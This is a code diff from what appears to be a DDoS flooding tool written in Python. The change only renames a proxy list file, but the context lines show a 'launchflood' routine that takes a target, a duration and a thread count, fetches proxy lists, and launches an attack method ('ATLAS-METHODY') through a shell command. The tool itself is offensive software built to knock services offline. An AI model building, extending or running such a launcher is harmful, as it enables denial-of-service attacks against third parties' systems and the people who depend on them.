@@ -37,7 +37,7 @@ def getproxy() -> None:
 #		print("[+] Downloading Proxies...")
 		for url in readurl:
 			url = url.strip()
-			with open("proxy.txt", mode="a") as file:
+			with open("proxies.txt", mode="a") as file:
 				try:
 					file.write(requests.get(url, timeout=1000).text)
 				except requests.ConnectError:
@@ -181,7 +181,7 @@ def launchflood():
 				floodtime = int(input("[X] Time: "))
 				thread = int(input("[X] Threads [3]: "))
 				getproxy()
-				run([f'screen -dm ./methods/ATLAS-METHODY {target} {floodtime} {thread} proxy.txt proxy.txt'], shell=True)
+				run([f'screen -dm ./methods/ATLAS-METHODY {target} {floodtime} {thread} proxies.txt proxies.txt'], shell=True)
 			except:
 				print("Error try again")
 		elif methods in ["ATLAS-STORM", "atlas-storm"]:
